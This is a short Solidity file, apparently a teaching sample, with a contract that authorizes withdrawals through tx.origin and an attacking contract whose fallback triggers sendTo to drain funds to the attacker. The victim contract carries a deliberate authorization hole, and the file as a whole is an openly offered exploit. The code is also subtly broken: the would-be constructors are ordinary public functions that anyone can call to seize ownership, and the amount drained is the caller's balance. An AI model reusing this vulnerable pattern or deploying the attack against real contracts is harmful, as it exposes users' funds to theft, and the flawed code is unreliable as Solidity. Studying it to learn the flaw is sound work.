pragma solidity 0.8.9;

contract MyContract {

    address owner;

    function myContract() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        require(tx.origin == owner);
        (bool success, ) = receiver.call{value:amount}("");
        require(success);
    }

}

contract AttackingContract {

    MyContract myContract;
    address attacker;

    function attackingContract(address myContractAddress) public {
        myContract = MyContract(myContractAddress);
        attacker = msg.sender;
    }

    fallback() external {
        myContract.sendTo(attacker, msg.sender.balance);
    }

}